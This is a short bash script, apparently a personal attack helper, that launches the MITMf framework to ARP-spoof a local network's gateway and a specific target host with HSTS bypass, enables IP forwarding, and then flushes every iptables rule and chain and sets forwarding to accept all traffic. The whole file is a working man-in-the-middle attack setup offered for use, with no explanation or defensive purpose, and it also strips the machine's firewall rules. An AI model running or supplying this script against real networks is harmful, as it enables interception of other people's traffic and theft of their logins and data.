#!/bin/bash

# Man in the Middle framework

mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.178 -i wlan0 --hsts && echo 1 > /proc/sys/net/ipv4/ip_forward

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT


